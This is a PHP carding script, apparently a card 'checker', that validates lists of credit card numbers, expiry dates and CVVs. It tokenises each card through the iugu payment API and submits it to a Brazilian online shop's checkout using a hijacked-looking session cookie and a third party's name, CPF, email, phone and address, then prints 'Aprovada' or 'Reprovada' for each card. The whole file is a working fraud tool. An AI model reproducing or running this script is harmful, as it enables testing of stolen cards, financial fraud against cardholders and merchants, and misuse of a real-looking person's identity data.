<?php

#➢ fmz @perryzin.
error_reporting(0);
ignore_user_abort();

    function getStr($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}

    function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
    }

    function replace_unicode_escape_sequence($match) { return mb_convert_encoding(pack('H*', $match[1]), 'UTF-8', 'UCS-2BE'); }
    function unicode_decode($str) { return preg_replace_callback('/\\\\u([0-9a-f]{4})/i', 'replace_unicode_escape_sequence', $str); }
    $delemitador = array("|", ":", "/");
    $lista = $_GET['lista'];
    
    $cc = multiexplode($delemitador, $lista)[0];
    $mes = multiexplode($delemitador, $lista)[1];
    $ano = multiexplode($delemitador, $lista)[2];
    $cvv = multiexplode($delemitador, $lista)[3];

    if (strlen($mes) == 1){
        $mes = "0$mes";
    }

    if (strlen($ano) == 2){
        $ano = "$ano";
    }

    $bin = substr($cc, 0,6);
   
    if ($cc == NULL || $mes == NULL || $ano == NULL || $cvv == NULL) {
die('"Erro!!","Teste não iniciado","cartão ou campo invalido","valor debitando: 2x de 74,00 = 37,00"');
}

//////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.iugu.com/v1/payment_token?method=credit_card&data[number]=$cc&data[verification_value]=$cvv&data[first_name]=ELIANA&data[last_name]=ALC%C3%82NTARA+VIRG%C3%8DLIO+&data[month]=$mes&data[year]=$ano&data[brand]=visa&data[fingerprint]=ffc35065-76e9-afb4-eab6-0fbe1dc406f6&data[sessionId]=f31dd821394f427fa3992869957b9e50&data[version]=2.1&account_id=947E2668ED5148128327A768E674F2F8&callback=callback1684910479250");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.iugu.com',
'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36',
'accept: */*',
'referer: https://tocadomonstro.com.br/',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

$r1 = curl_exec($ch);
$token = getStr($r1, 'id":"', '"', 1);

///////////////// REQ /////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://tocadomonstro.com.br//sendPay/");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: tocadomonstro.com.br', 
'Accept: application/json', 
'X-Requested-With: XMLHttpRequest', 
'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-J810M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36', 
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8', 
'Origin: https://tocadomonstro.com.br', 
'Referer: https://tocadomonstro.com.br/checkout', 
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7', 
'Cookie: PHPSESSID=282327c2a4027cda17529830496b5c02297f6794; purecookieDismiss_=1; _ga=GA1.3.1037641204.1684899577; _gid=GA1.3.1137326835.1684899577; carrinho_tocadomonstro10=e53724f8924f2971e2df92cbe9ed; cdn.iugu.100164.ka.ck=b122f1f0549c293d70ad9a36f2ba2abd670e8c1cae5b532b8f98bb8fc1192b812e857244d9af1ca0327292e2f06cae17ab377804da1fb158e88e6a1099d9416d20ccfa6abf8723dcd82aee0fd199a515253f493b9bc6dd8d11c281613ddf044037216ff90e2a8db798691af11634c5aff706712e15c761196bc70cfac7b5fbd6dc45d39d49872336992389a2c64e24c91a67274b33492a8ccdd9de'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'token=06a4bb432f7a231750771701f737&nome=Eliana&sobrenome=Alc%C3%A2ntara+Virg%C3%ADlio&cpf=404.517.038-39&email=marioaraujo3292%40gmail.com&telefone=(19)+98893-2439&cep=81810510&endereco=Rua+Carolina+Derosso&numero=245&bairro=Xaxim&estado=Paran%C3%A1&cidade=Curitiba&complemento=Casa&tp_envio=90689&tp_pagamento=1&card_number='.$cc.'&card_name=Eliana+Alc%C3%A2ntara+Virg%C3%ADlio+&card_date='.$mes.'%2F'.$ano.'&card_cvv='.$cvv.'&parcelas=1&token_iugu='.$token.'');
 $r2 = curl_exec($ch);
$msg  = getStr($r2, 'erro":"', '"', 1);

if(strpos($r2, 'C\u00f3digo de seguran\u00e7a inv\u00e1lido.')){
    
die("<b>Aprovada -> <span class='text-success'>$lista | </span> Retorno:<span class='text-primary'>'.$msg.'</span> => <span class='text-warning'>@perryzin</span><br></b>");
}else{


die("<b>Reprovada -> $lista Retorno: <span class='text-danger'>'.$msg.'</span> => <span class='text-danger'>@perryzin</span><br>");
}
?>

